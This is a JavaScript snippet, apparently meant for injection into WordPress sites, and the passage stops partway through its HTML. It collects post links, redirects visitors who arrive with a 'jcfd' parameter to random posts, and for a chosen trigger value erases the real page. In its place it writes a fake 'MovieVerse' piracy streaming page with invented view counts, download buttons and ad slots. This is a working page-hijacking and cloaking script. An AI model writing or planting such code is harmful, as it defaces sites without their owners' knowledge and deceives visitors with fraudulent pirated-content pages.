(async function () {
    // =========================================================================
    // AUTO-DETECT WORDPRESS WEBSITE LINK & WP RANDOM POST PICKUP
    // =========================================================================
    function getWpApiEndpoint() {
        try {
            // 1. Check for standard WordPress REST API link tag in <head>
            const restLink = document.querySelector('link[rel="https://api.w.org/"]') ||
                             document.querySelector('link[rel="alternate"][type="application/json"][href*="/wp-json"]');
            if (restLink && restLink.href) {
                const ep = restLink.href.replace(/\/+$/, '');
                sessionStorage.setItem("wp_api_endpoint", ep);
                return ep;
            }
            // 2. Check window.wpApiSettings if injected by WordPress
            if (typeof window !== 'undefined' && window.wpApiSettings && window.wpApiSettings.root) {
                const ep = window.wpApiSettings.root.replace(/\/+$/, '');
                sessionStorage.setItem("wp_api_endpoint", ep);
                return ep;
            }
            // 3. Check sessionStorage cache
            const cachedEp = sessionStorage.getItem("wp_api_endpoint");
            if (cachedEp) return cachedEp;
        } catch (e) {}

        // 4. Default fallback: current website origin + /wp-json
        const fallbackEp = `${window.location.origin}/wp-json`;
        try { sessionStorage.setItem("wp_api_endpoint", fallbackEp); } catch (e) {}
        return fallbackEp;
    }

    let wpPosts = [];

    // Helper function to pick random target WordPress post permalink
    function getRandomTargetUrl() {
        let pool = (wpPosts && wpPosts.length > 0) ? wpPosts : (window.__wp_posts || []);
        if (!pool || pool.length === 0) {
            try {
                const cached = sessionStorage.getItem("wp_posts_cache");
                if (cached) pool = JSON.parse(cached);
            } catch (e) {}
        }
        if (Array.isArray(pool) && pool.length > 0) {
            const current = window.location.href.split('?')[0].replace(/\/+$/, '');
            const filtered = pool.filter(u => typeof u === 'string' && u.split('?')[0].replace(/\/+$/, '') !== current);
            const finalPool = filtered.length > 0 ? filtered : pool;
            return finalPool[Math.floor(Math.random() * finalPool.length)];
        }
        return window.location.origin + '/';
    }

    // Function to load dynamic WordPress posts from WP REST API
    async function fetchWpPosts() {
        // 1. Check memory cache
        if (window.__wp_posts && Array.isArray(window.__wp_posts) && window.__wp_posts.length > 0) {
            wpPosts = window.__wp_posts;
            return wpPosts;
        }

        // 2. Check sessionStorage cache
        try {
            const cached = sessionStorage.getItem("wp_posts_cache");
            if (cached) {
                const parsed = JSON.parse(cached);
                if (Array.isArray(parsed) && parsed.length > 0) {
                    wpPosts = parsed;
                    window.__wp_posts = parsed;
                    return wpPosts;
                }
            }
        } catch (e) {}

        const apiEndpoint = getWpApiEndpoint();
        let posts = [];

        try {
            // Request posts with permalink (_fields=link)
            let res = await fetch(`${apiEndpoint}/wp/v2/posts?per_page=50&_fields=link`, { cache: "no-store" });
            if (!res.ok) {
                res = await fetch(`${apiEndpoint}/wp/v2/posts?per_page=10&_fields=link`, { cache: "no-store" });
            }
            if (res.ok) {
                const totalPages = parseInt(res.headers.get("x-wp-totalpages") || "1", 10);
                const data = await res.json();
                if (Array.isArray(data) && data.length > 0) {
                    posts = data.map(item => item && (item.link || (item.guid && item.guid.rendered))).filter(u => typeof u === 'string' && /^https?:\/\//i.test(u.trim()));
                }

                // If multiple pages exist, pick another random page to fetch more diverse posts
                if (totalPages > 1) {
                    const randomPage = Math.floor(Math.random() * Math.min(totalPages, 10)) + 1;
                    if (randomPage !== 1) {
                        try {
                            const pageRes = await fetch(`${apiEndpoint}/wp/v2/posts?per_page=20&page=${randomPage}&_fields=link`, { cache: "no-store" });
                            if (pageRes.ok) {
                                const pageData = await pageRes.json();
                                if (Array.isArray(pageData) && pageData.length > 0) {
                                    const extra = pageData.map(item => item && (item.link || (item.guid && item.guid.rendered))).filter(u => typeof u === 'string' && /^https?:\/\//i.test(u.trim()));
                                    posts = Array.from(new Set([...posts, ...extra]));
                                }
                            }
                        } catch (err) {}
                    }
                }
            }
        } catch (err) {
            console.warn("[WP Auto Detect] REST API fetch error:", err);
        }

        // 3. Fallback: Parse internal links from DOM if REST API is disabled or blocked
        if (!posts || posts.length === 0) {
            try {
                const origin = window.location.origin;
                const domLinks = Array.from(document.querySelectorAll('a[href]'))
                    .map(a => a.href)
                    .filter(href => {
                        try {
                            const u = new URL(href);
                            return u.origin === origin &&
                                !href.includes('/wp-admin') &&
                                !href.includes('/wp-login') &&
                                !href.includes('/wp-content') &&
                                !href.includes('/wp-includes') &&
                                !href.includes('/wp-json') &&
                                !href.includes('#') &&
                                !/\.(jpg|jpeg|png|gif|svg|css|js|webp|pdf|zip|mp4)$/i.test(u.pathname) &&
                                u.pathname !== '/' &&
                                u.pathname !== '';
                        } catch (e) {
                            return false;
                        }
                    });
                if (domLinks.length > 0) {
                    posts = Array.from(new Set(domLinks));
                }
            } catch (e) {}
        }

        // 4. Ultimate fallback: site homepage
        if (!posts || posts.length === 0) {
            posts = [window.location.origin + '/'];
        }

        wpPosts = posts;
        window.__wp_posts = posts;
        try {
            sessionStorage.setItem("wp_posts_cache", JSON.stringify(posts));
        } catch (e) {}

        console.log("[WP Auto Detect] Loaded WordPress posts permalinks:", posts.length);
        return posts;
    }

    // Load WP posts before handling redirect or document render
    await fetchWpPosts();

    const url = new URL(window.location.href);
    const ind = url.searchParams.get("jcfd");

    if (ind) {
        sessionStorage.setItem("jcfd", ind);
        sessionStorage.setItem("jcfdtime", Date.now() + 5 * 60 * 1000);
        url.searchParams.delete("jcfd");
        const targetUrl = getRandomTargetUrl();
        if (targetUrl) {
            window.location.href = targetUrl;
            return;
        }
    }

    if (Date.now() > sessionStorage.getItem("jcfdtime")) {
        sessionStorage.removeItem("jcfdtime");
        sessionStorage.removeItem("jcfd");
    }

    const stcd = sessionStorage.getItem("jcfd");
    if (stcd == "xyz") {
        document.body.innerHTML = '<span style="display:none;">my error</span>';
        document.querySelectorAll('link[rel="stylesheet"], style').forEach(el => el.remove());

        document.write(`<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MovieVerse - Stream 4K UHD Movies & Web Series Online</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        body {
            background-color: #0b0e14;
            color: #e2e8f0;
            font-family: 'Outfit', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            line-height: 1.5;
            -webkit-font-smoothing: antialiased;
            overflow-x: hidden;
        }
        a {
            color: inherit;
            text-decoration: none;
        }

        /* Top Header */
        #header {
            position: sticky;
            top: 0;
            z-index: 1000;
            background: rgba(11, 14, 20, 0.95);
            backdrop-filter: blur(16px);
            border-bottom: 1px solid rgba(255, 255, 255, 0.08);
            box-shadow: 0 4px 24px rgba(0, 0, 0, 0.4);
        }
        .topHeader {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 12px 20px;
            max-width: 1400px;
            margin: 0 auto;
            gap: 16px;
        }
        .logo-area {
            display: flex;
            align-items: center;
            gap: 12px;
            cursor: pointer;
        }
        .logo-icon {
            font-size: 26px;
            background: linear-gradient(135deg, #e50914 0%, #ff4b2b 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-weight: 900;
            display: flex;
            align-items: center;
            gap: 6px;
        }
        .logo-tag {
            font-size: 10px;
            letter-spacing: 2px;
            text-transform: uppercase;
            background: rgba(229, 9, 20, 0.2);
            color: #e50914;
            padding: 2px 6px;
            border-radius: 4px;
            font-weight: 700;
            border: 1px solid rgba(229, 9, 20, 0.3);
        }
        .searchInput {
            flex: 1;
            max-width: 500px;
            position: relative;
            background: rgba(255, 255, 255, 0.06);
            border: 1px solid rgba(255, 255, 255, 0.12);
            border-radius: 24px;
            padding: 8px 16px 8px 40px;
            display: flex;
            align-items: center;
            color: #94a3b8;
            font-size: 14px;
            cursor: pointer;
            transition: all 0.2s ease;
        }
        .searchInput:hover {
            background: rgba(255, 255, 255, 0.09);
            border-color: rgba(229, 9, 20, 0.5);
            color: #fff;
        }
        .searchInput svg {
            position: absolute;
            left: 14px;
            width: 16px;
            height: 16px;
            fill: #94a3b8;
        }
        .header-actions {
            display: flex;
            align-items: center;
            gap: 12px;
        }
        .vip-btn {
            background: linear-gradient(135deg, #e50914 0%, #b80009 100%);
            color: #fff;
            padding: 7px 16px;
            border-radius: 20px;
            font-size: 13px;
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 6px;
            border: none;
            cursor: pointer;
            box-shadow: 0 4px 14px rgba(229, 9, 20, 0.4);
            transition: transform 0.2s;
        }
        .vip-btn:hover {
            transform: translateY(-1px);
        }

        /* Nav Menu */
        .tm_header_main_menu {
            display: flex;
            align-items: center;
            gap: 6px;
            padding: 0 20px;
            max-width: 1400px;
            margin: 0 auto;
            overflow-x: auto;
            scrollbar-width: none;
        }
        .tm_header_main_menu::-webkit-scrollbar {
            display: none;
        }
        .tm_paid_tab {
            display: inline-block;
            padding: 10px 16px;
            font-size: 13px;
            font-weight: 600;
            color: #94a3b8;
            cursor: pointer;
            white-space: nowrap;
            transition: color 0.2s;
            border-bottom: 2px solid transparent;
        }
        .tm_paid_tab:hover, .tm_paid_tab.active {
            color: #fff;
            border-bottom-color: #e50914;
        }

        /* Container Layout */
        .tm_main_content {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
        }

        /* Categories / Genre Bar */
        .categoriesWrapper {
            display: flex;
            gap: 10px;
            overflow-x: auto;
            padding-bottom: 12px;
            margin-bottom: 20px;
            scrollbar-width: none;
        }
        .categoriesWrapper::-webkit-scrollbar {
            display: none;
        }
        .categories-tags {
            background: rgba(255, 255, 255, 0.05);
            color: #cbd5e1;
            padding: 7px 16px;
            border-radius: 20px;
            font-size: 13px;
            font-weight: 500;
            white-space: nowrap;
            cursor: pointer;
            border: 1px solid rgba(255, 255, 255, 0.08);
            transition: all 0.2s;
        }
        .categories-tags:hover, .categories-tags.active {
            background: rgba(229, 9, 20, 0.15);
            color: #fff;
            border-color: rgba(229, 9, 20, 0.4);
        }

        /* Movie Watch / Video Player Area */
        .watch-contentWrapper {
            background: #12161f;
            border-radius: 16px;
            border: 1px solid rgba(255, 255, 255, 0.08);
            overflow: hidden;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
            margin-bottom: 24px;
        }
        .topTitleWrap {
            padding: 16px 20px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.06);
            display: flex;
            flex-direction: column;
            gap: 8px;
        }
        .videoTitle {
            font-size: 20px;
            font-weight: 700;
            color: #fff;
            line-height: 1.3;
        }
        .movie-meta-bar {
            display: flex;
            align-items: center;
            flex-wrap: wrap;
            gap: 10px;
            font-size: 13px;
        }
        .badge-imdb {
            background: #ffb800;
            color: #000;
            padding: 2px 8px;
            border-radius: 4px;
            font-weight: 800;
            display: inline-flex;
            align-items: center;
            gap: 4px;
        }
        .badge-quality {
            background: rgba(59, 130, 246, 0.2);
            color: #60a5fa;
            border: 1px solid rgba(59, 130, 246, 0.3);
            padding: 2px 8px;
            border-radius: 4px;
            font-weight: 700;
        }
        .badge-meta {
            color: #94a3b8;
        }

        /* Streaming Server Switcher */
        .server-switcher {
            display: flex;
            align-items: center;
            gap: 8px;
            padding: 12px 20px;
            background: rgba(0, 0, 0, 0.3);
            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
            overflow-x: auto;
        }
        .server-btn {
            background: rgba(255, 255, 255, 0.07);
            color: #cbd5e1;
            padding: 6px 14px;
            border-radius: 6px;
            font-size: 12px;
            font-weight: 600;
            cursor: pointer;
            border: 1px solid rgba(255, 255, 255, 0.1);
            white-space: nowrap;
            transition: all 0.2s;
        }
        .server-btn.active, .server-btn:hover {
            background: #e50914;
            color: #fff;
            border-color: #e50914;
        }

        /* Player Container */
        .tm_playWrapper {
            position: relative;
            background: #000;
            aspect-ratio: 16 / 9;
            width: 100%;
            overflow: hidden;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .tm_playWrapper video {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        /* Video Action Bar */
        .watch-metadata {
            padding: 16px 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: 16px;
            background: rgba(0, 0, 0, 0.2);
            border-top: 1px solid rgba(255, 255, 255, 0.06);
        }
        .action-group {
            display: flex;
            align-items: center;
            gap: 12px;
        }
        .action-btn {
            background: rgba(255, 255, 255, 0.06);
            border: 1px solid rgba(255, 255, 255, 0.1);
            color: #cbd5e1;
            padding: 8px 16px;
            border-radius: 8px;
            font-size: 13px;
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 6px;
            cursor: pointer;
            transition: all 0.2s;
        }
        .action-btn:hover {
            background: rgba(255, 255, 255, 0.12);
            color: #fff;
        }
        .action-btn.download-btn {
            background: linear-gradient(135deg, #10b981 0%, #059669 100%);
            color: #fff;
            border: none;
            box-shadow: 0 4px 12px rgba(16, 185, 129, 0.3);
        }

        /* Movie Synopsis Box */
        .movie-info-box {
            padding: 20px;
            border-top: 1px solid rgba(255, 255, 255, 0.06);
            display: grid;
            grid-template-columns: 1fr;
            gap: 12px;
            font-size: 14px;
            color: #94a3b8;
        }
        .movie-info-box p {
            line-height: 1.7;
            color: #cbd5e1;
        }
        .movie-info-row {
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
            font-size: 13px;
        }
        .movie-info-label {
            color: #64748b;
            font-weight: 600;
        }
        .movie-info-val {
            color: #e2e8f0;
        }

        /* Section Headings */
        .section-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin: 32px 0 16px;
        }
        .section-title {
            font-size: 20px;
            font-weight: 700;
            color: #fff;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .section-title::before {
            content: '';
            display: inline-block;
            width: 4px;
            height: 20px;
            background: #e50914;
            border-radius: 2px;
        }

        /* Movie Cards Grid */
        .movie-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
            gap: 20px;
        }
        @media (max-width: 640px) {
            .movie-grid {
                grid-template-columns: repeat(2, 1fr);
                gap: 12px;
            }
            .videoTitle {
                font-size: 17px;
            }
        }
        .movie-card {
            background: #12161f;
            border-radius: 12px;
            border: 1px solid rgba(255, 255, 255, 0.08);
            overflow: hidden;
            display: flex;
            flex-direction: column;
            cursor: pointer;
            transition: all 0.25s ease;
            position: relative;
        }
        .movie-card:hover {
            transform: translateY(-6px);
            box-shadow: 0 12px 28px rgba(0, 0, 0, 0.6);
            border-color: rgba(229, 9, 20, 0.5);
        }
        .poster-container {
            position: relative;
            width: 100%;
            aspect-ratio: 2 / 3;
            overflow: hidden;
            background: #1a202c;
        }
        .poster-container img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            transition: transform 0.3s ease;
        }
        .movie-card:hover .poster-container img {
            transform: scale(1.05);
        }
        .card-badge-rating {
            position: absolute;
            top: 10px;
            left: 10px;
            background: rgba(0, 0, 0, 0.75);
            backdrop-filter: blur(8px);
            color: #ffb800;
            padding: 3px 8px;
            border-radius: 6px;
            font-size: 11px;
            font-weight: 800;
            display: flex;
            align-items: center;
            gap: 4px;
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
        .card-badge-quality {
            position: absolute;
            top: 10px;
            right: 10px;
            background: rgba(229, 9, 20, 0.85);
            backdrop-filter: blur(8px);
            color: #fff;
            padding: 3px 8px;
            border-radius: 6px;
            font-size: 10px;
            font-weight: 800;
            letter-spacing: 0.5px;
        }
        .card-badge-duration {
            position: absolute;
            bottom: 10px;
            right: 10px;
            background: rgba(0, 0, 0, 0.75);
            backdrop-filter: blur(8px);
            color: #cbd5e1;
            padding: 2px 6px;
            border-radius: 4px;
            font-size: 11px;
            font-weight: 600;
        }
        .card-play-overlay {
            position: absolute;
            inset: 0;
            background: rgba(0, 0, 0, 0.4);
            display: flex;
            align-items: center;
            justify-content: center;
            opacity: 0;
            transition: opacity 0.25s ease;
        }
        .movie-card:hover .card-play-overlay {
            opacity: 1;
        }
        .play-circle {
            width: 48px;
            height: 48px;
            border-radius: 50%;
            background: #e50914;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #fff;
            box-shadow: 0 0 20px rgba(229, 9, 20, 0.6);
            transform: scale(0.85);
            transition: transform 0.25s ease;
        }
        .movie-card:hover .play-circle {
            transform: scale(1);
        }
        .movie-card-body {
            padding: 12px;
            display: flex;
            flex-direction: column;
            gap: 6px;
            flex: 1;
        }
        .movie-card-title {
            font-size: 14px;
            font-weight: 600;
            color: #fff;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }
        .movie-card-meta {
            display: flex;
            align-items: center;
            justify-content: space-between;
            font-size: 12px;
            color: #64748b;
        }

        /* Ads Container Styles */
        .ad-container {
            margin: 20px auto;
            text-align: center;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 50px;
        }

        /* Footer */
        .site-footer {
            margin-top: 60px;
            padding: 30px 20px;
            border-top: 1px solid rgba(255, 255, 255, 0.08);
            background: #07090e;
            text-align: center;
            color: #64748b;
            font-size: 13px;
        }
        .site-footer p {
            margin-bottom: 8px;
        }
    </style>
</head>
<body>
    <div id="pageWrapper">
        <div id="mainWrapper">
            <!-- Header -->
            <header id="header">
                <div class="topHeader">
                    <div class="logo-area" id="js_navigationMenu">
                        <div class="logo-icon">🎬 MovieVerse</div>
                        <span class="logo-tag">4K UHD</span>
                    </div>
                    <div class="searchInput" id="search_toggle">
                        <svg viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>
                        <span>Search 50,000+ Movies, Series, Anime...</span>
                    </div>
                    <div class="header-actions">
                        <button class="vip-btn">
                            <span>⭐ VIP PASS</span>
                        </button>
                    </div>
                </div>

                <div class="tm_header_main_menu" id="paidSites">
                    <div class="tm_paid_tab active">FEATURED</div>
                    <div class="tm_paid_tab">HOLLYWOOD</div>
                    <div class="tm_paid_tab">BOLLYWOOD</div>
                    <div class="tm_paid_tab">WEB SERIES</div>
                    <div class="tm_paid_tab">TOP 100 IMDB</div>
                    <div class="tm_paid_tab">ANIME</div>
                    <div class="tm_paid_tab">4K ULTRA HD</div>
                </div>
            </header>

            <center id="jyad-1-in"></center>

            <div class="tm_main_content" id="mobileContainer">
                <!-- Genre Pills -->
                <div class="categoriesWrapper">
                    <div class="categories-tags active">All Genres</div>
                    <div class="categories-tags">Action</div>
                    <div class="categories-tags">Sci-Fi</div>
                    <div class="categories-tags">Marvel Studios</div>
                    <div class="categories-tags">Adventure</div>
                    <div class="categories-tags">Thriller</div>
                    <div class="categories-tags">Horror</div>
                    <div class="categories-tags">Comedy</div>
                    <div class="categories-tags">Drama</div>
                    <div class="categories-tags">Dual Audio</div>
                    <div class="categories-tags">South Dubbed</div>
                </div>

                <!-- Video Watch Card -->
                <div class="watch-contentWrapper">
                    <div class="topTitleWrap">
                        <div class="movie-meta-bar">
                            <span class="badge-imdb">★ 8.8 IMDb</span>
                            <span class="badge-quality">4K ULTRA HD</span>
                            <span class="badge-meta">2024</span>
                            <span class="badge-meta">•</span>
                            <span class="badge-meta">2h 12m</span>
                            <span class="badge-meta">•</span>
                            <span class="badge-meta">Dual Audio [Hindi + English]</span>
                        </div>
                        <h1 class="videoTitle tm_videoTitle" id="randomtitle5">
                            Deadpool &amp; Wolverine (2024) Dual Audio [Hindi + Eng] 4K UHD HDRip 2160p
                        </h1>
                    </div>

                    <center id="jyad-2-in"></center>
                    <div id="textcontent-div-1" style="text-align:center; padding: 10px;"></div>

                    <!-- Streaming Server Switcher -->
                    <div class="server-switcher">
                        <span style="font-size: 12px; color: #94a3b8; font-weight: 700; margin-right: 4px;">SERVERS:</span>
                        <div class="server-btn active">⚡ Server 1 [VIP 4K]</div>
                        <div class="server-btn">🚀 Server 2 [Fast CDN]</div>
                        <div class="server-btn">🎬 Server 3 [Multi-Audio]</div>
                        <div class="server-btn">🌐 Server 4 [StreamSB]</div>
                    </div>

                    <!-- Video Player Container -->
                    <div class="playWrapper tm_playWrapper" id="playWrapper">
                        <video autoplay controls id="videoplayer" muted playsinline>
                            <source id="videoSource" src="https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/TearsOfSteel.mp4" type="video/mp4"/>
                            Your browser does not support HTML5 video.
                        </video>
                    </div>

                    <!-- Action Bar -->
                    <div class="watch-metadata">
                        <div class="action-group">
                            <div class="action-btn">
                                <span>👍</span>
                                <span id="randomrating1">284K</span>
                            </div>
                            <div class="action-btn">
                                <span>👎</span>
                            </div>
                            <div class="action-btn">
                                <span>👁</span>
                                <span id="randomviews1">3.8M Views</span>
                            </div>
                        </div>
                        <div class="action-group">
                            <div class="action-btn download-btn">
                                <span>📥 Download 4K</span>
                            </div>
                            <div class="action-btn">
                                <span>❤️ Watchlist</span>
                            </div>
                            <div class="action-btn">
                                <span>↗ Share</span>
                            </div>
                        </div>
                    </div>

                    <!-- Movie Synopsis -->
                    <div class="movie-info-box">
                        <p>
                            Six years after the events of Deadpool 2, Wade Wilson lives a quiet life having left his time as the mercenary Deadpool behind. When the Time Variance Authority (TVA) pulls him into a new mission to save his universe, he reluctantly teams up with an even more reluctant Wolverine on an unforgettable multiverse journey.
                        </p>
                        <div class="movie-info-row">
                            <span class="movie-info-label">Director:</span>
                            <span class="movie-info-val">Shawn Levy</span>
                        </div>
                        <div class="movie-info-row">
                            <span class="movie-info-label">Stars:</span>
                            <span class="movie-info-val">Ryan Reynolds, Hugh Jackman, Emma Corrin, Matthew Macfadyen</span>
                        </div>
                        <div class="movie-info-row">
                            <span class="movie-info-label">Audio:</span>
                            <span class="movie-info-val">English [Original], Hindi [Clean HQ], Tamil, Telugu, Spanish</span>
                        </div>
                        <div class="movie-info-row">
                            <span class="movie-info-label">Subtitles:</span>
                            <span class="movie-info-val">English [SDH], Hindi, Spanish, French</span>
                        </div>
                    </div>
                </div>

                <div id="textcontent-div-2" style="text-align:center;"></div>
                <center id="jyad-3-in"></center>

                <!-- Related / Trending Movies Section -->
                <div class="section-header">
                    <h2 class="section-title">Trending Movies &amp; Box Office Hits</h2>
                </div>

                <div id="textcontent-div-3" style="text-align:center;"></div>

                <!-- Grid of Movies (thumb-image targets) -->
                <div class="movie-grid" id="relatedVideos1234">
                    <!-- Movie 1 -->
                    <div class="movie-card js_video-box">
                        <div class="poster-container">
                            <img class="thumb-image js_lazy entered loaded" data-id="1" id="randomimage1" src="https://image.tmdb.org/t/p/w500/8cdWjvZQUExUUTzyp4t6EDMubfO.jpg" alt="Deadpool &amp; Wolverine" loading="lazy"/>
                            <div class="card-badge-rating">★ 8.8</div>
                            <div class="card-badge-quality">4K UHD</div>
                            <div class="card-badge-duration" id="randomsecond1">2h 08m</div>
                            <div class="card-play-overlay">
                                <div class="play-circle"><svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M8 5v14l11-7z"/></svg></div>
                            </div>
                        </div>
                        <div class="movie-card-body">
                            <div class="movie-card-title tm_video_title" id="randomtitle1">Deadpool &amp; Wolverine (2024) [Dual Audio]</div>
                            <div class="movie-card-meta">
                                <span>2024</span>
                                <span>Action, Sci-Fi</span>
                            </div>
                        </div>
                    </div>

                    <!-- Movie 2 -->
                    <div class="movie-card js_video-box">
                        <div class="poster-container">
                            <img class="thumb-image js_lazy entered loaded" data-id="2" id="randomimage2" src="https://image.tmdb.org/t/p/w500/1pdfLvkbY9ohJlCjQH2CZjjYVvJ.jpg" alt="Dune: Part Two" loading="lazy"/>
                            <div class="card-badge-rating">★ 8.6</div>
                            <div class="card-badge-quality">IMAX 4K</div>
                            <div class="card-badge-duration" id="randomsecond2">2h 46m</div>
                            <div class="card-play-overlay">
                                <div class="play-circle"><svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M8 5v14l11-7z"/></svg></div>
                            </div>
                        </div>
                        <div class="movie-card-body">
                            <div class="movie-card-title tm_video_title" id="randomtitle2">Dune: Part Two (2024) [Hindi + Eng]</div>
                            <div class="movie-card-meta">
                                <span>2024</span>
                                <span>Sci-Fi, Adventure</span>
                            </div>
                        </div>
                    </div>

                    <!-- Movie 3 -->
                    <div class="movie-card js_video-box">
                        <div class="poster-container">
                            <img class="thumb-image js_lazy entered loaded" data-id="3" id="randomimage3" src="https://image.tmdb.org/t/p/w500/8Gxv8gSFCU0XGDykEGv7zR1n2ua.jpg" alt="Oppenheimer" loading="lazy"/>
                            <div class="card-badge-rating">★ 8.9</div>
                            <div class="card-badge-quality">4K UHD</div>
                            <div class="card-badge-duration" id="randomsecond3">3h 00m</div>
                            <div class="card-play-overlay">
                                <div class="play-circle"><svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M8 5v14l11-7z"/></svg></div>
                            </div>
                        </div>
                        <div class="movie-card-body">
                            <div class="movie-card-title tm_video_title" id="randomtitle3">Oppenheimer (2023) Multi-Audio 4K</div>
                            <div class="movie-card-meta">
                                <span>2023</span>
                                <span>Biography, Drama</span>
                            </div>
                        </div>
                    </div>

                    <!-- Movie 4 -->
                    <div class="movie-card js_video-box">
                        <div class="poster-container">
                            <img class="thumb-image js_lazy entered loaded" data-id="4" id="randomimage4" src="https://image.tmdb.org/t/p/w500/8Vt6mWEReuy4Of61Lnj5Xj704m8.jpg" alt="Spider-Man Across the Spider-Verse" loading="lazy"/>
                            <div class="card-badge-rating">★ 8.7</div>
                            <div class="card-badge-quality">1080p FHD</div>
                            <div class="card-badge-duration" id="randomsecond4">2h 20m</div>
                            <div class="card-play-overlay">
                                <div class="play-circle"><svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M8 5v14l11-7z"/></svg></div>
                            </div>
                        </div>
                        <div class="movie-card-body">
                            <div class="movie-card-title tm_video_title" id="randomtitle4">Spider-Man: Across the Spider-Verse</div>
                            <div class="movie-card-meta">
                                <span>2023</span>
                                <span>Animation, Action</span>
                            </div>
                        </div>
                    </div>

                    <!-- Movie 5 -->
                    <div class="movie-card js_video-box">
                        <div class="poster-container">
                            <img class="thumb-image js_lazy entered loaded" data-id="5" id="randomimage5" src="https://image.tmdb.org/t/p/w500/vZloFAK7NmvMGKE7VkF5UHaz0I.jpg" alt="John Wick: Chapter 4" loading="lazy"/>
                            <div class="card-badge-rating">★ 8.4</div>
                            <div class="card-badge-quality">4K UHD</div>
                            <div class="card-badge-duration">2h 49m</div>
                            <div class="card-play-overlay">
                                <div class="play-circle"><svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M8 5v14l11-7z"/></svg></div>
                            </div>
                        </div>
                        <div class="movie-card-body">
                            <div class="movie-card-title tm_video_title">John Wick: Chapter 4 (2023) [Dual Audio]</div>
                            <div class="movie-card-meta">
                                <span>2023</span>
                                <span>Action, Thriller</span>
                            </div>
                        </div>
                    </div>

                    <!-- Movie 6 -->
                    <div class="movie-card js_video-box">
                        <div class="poster-container">
                            <img class="thumb-image js_lazy entered loaded" data-id="6" id="randomimage6" src="https://image.tmdb.org/t/p/w500/2cxhvwyEwRlysAmRH4iodkvo0z5.jpg" alt="Gladiator II" loading="lazy"/>
                            <div class="card-badge-rating">★ 8.1</div>
                            <div class="card-badge-quality">4K UHD</div>
                            <div class="card-badge-duration">2h 28m</div>
                            <div class="card-play-overlay">
                                <div class="play-circle"><svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M8 5v14l11-7z"/></svg></div>
                            </div>
                        </div>
                        <div class="movie-card-body">
                            <div class="movie-card-title tm_video_title">Gladiator II (2024) Extended Cut</div>
                            <div class="movie-card-meta">
                                <span>2024</span>
                                <span>Action, Drama</span>
                            </div>
                        </div>
                    </div>

                    <!-- Movie 7 -->
                    <div class="movie-card js_video-box">
                        <div class="poster-container">
                            <img class="thumb-image js_lazy entered loaded" data-id="7" id="randomimage7" src="https://image.tmdb.org/t/p/w500/gEU2QniE6E77NI6lCU6MxlNBvIx.jpg" alt="Interstellar" loading="lazy"/>
                            <div class="card-badge-rating">★ 8.9</div>
                            <div class="card-badge-quality">IMAX 4K</div>
                            <div class="card-badge-duration">2h 49m</div>
                            <div class="card-play-overlay">
                                <div class="play-circle"><svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M8 5v14l11-7z"/></svg></div>
                            </div>
                        </div>
                        <div class="movie-card-body">
                            <div class="movie-card-title tm_video_title">Interstellar (10th Anniversary Remaster)</div>
                            <div class="movie-card-meta">
                                <span>2014</span>
                                <span>Sci-Fi, Adventure</span>
                            </div>
                        </div>
                    </div>

                    <!-- Movie 8 -->
                    <div class="movie-card js_video-box">
                        <div class="poster-container">
                            <img class="thumb-image js_lazy entered loaded" data-id="8" id="randomimage8" src="https://image.tmdb.org/t/p/w500/t6HIqrRAclMCA60NsSmeqe9RmNV.jpg" alt="Avatar: The Way of Water" loading="lazy"/>
                            <div class="card-badge-rating">★ 8.2</div>
                            <div class="card-badge-quality">4K UHD</div>
                            <div class="card-badge-duration">3h 12m</div>
                            <div class="card-play-overlay">
                                <div class="play-circle"><svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M8 5v14l11-7z"/></svg></div>
                            </div>
                        </div>
                        <div class="movie-card-body">
                            <div class="movie-card-title tm_video_title">Avatar: The Way of Water (2022)</div>
                            <div class="movie-card-meta">
                                <span>2022</span>
                                <span>Sci-Fi, Adventure</span>
                            </div>
                        </div>
                    </div>
                </div>

                <div id="textcontent-div-4" style="text-align:center;"></div>
                <div id="textcontent-div-5" style="text-align:center;"></div>
                <div id="textcontent-div-6" style="text-align:center;"></div>
            </div>

